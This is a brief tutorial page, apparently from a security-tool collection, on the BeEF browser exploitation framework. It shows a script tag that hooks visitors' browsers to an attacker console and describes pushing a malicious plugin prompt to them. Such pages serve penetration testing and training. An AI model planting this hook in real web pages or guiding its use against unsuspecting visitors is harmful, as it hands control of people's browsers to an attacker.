# BeEF - The Browser Exploitation Framework
[Documentation](https://adhdproject.github.io/#!Tools/Attack/Beef.md)
[Website](https://beefproject.com/)
The BeEF is a framework for remotely controlling and exploiting the web browsers of unsuspecting targets. The core concept of BeEF is to "hook" browsers that visit a webpage controlled by the attacker, and by doing so hand over arbitrary control of the webpage instance to a remote console. Although BeEF is conceptually simple, its module driven extensibility, as well as its REST api for externally scripting attacks, make it extremely flexible. 

### Usage
1) First, a webpage must be primed to hook visitors. Embedding a single script tag loading BeEF's hook functionality is enough. Once a web browser visits a webpage containing hook code, the browser will reach out to the BeEF console. 
```html
<script src='http://192.168.1.109:3000/hook.js'></script>
```

2. Next, the attacker can log into the BeEF web console. On the left will show hooked browser instances, and on the right will be information collected by BeEF about them. 

![beef web console](https://adhdproject.github.io/Tools/Attack/Beef_files/Image_004.PNG)

3) From the commands tab, in the right window, the attacker can select from well over 100 pre-loaded attack modules, as well as any that they may write themselves. Here is an example of a malicious Firefox plugin prompt. 

![enter image description here](https://adhdproject.github.io/Tools/Attack/Beef_files/Image_007.png)

After a few seconds, the hooked browser will display this message:

![enter image description here](https://adhdproject.github.io/Tools/Attack/Beef_files/Image_009.png)
What follows once the plugin is installed is up to the imagination of the attacker. All attack modules are customizable, for example allowing you to choose the malicious module installed in this scenario. There is a lot of room for creativity. Check out some of BeEF's other plugins [here.](https://github.com/beefproject/beef/tree/master/modules)

### REST API
A video showcasing using BeEF's REST api for scripted attacks can be seen [here.](https://youtu.be/xdbvU_U42kY)
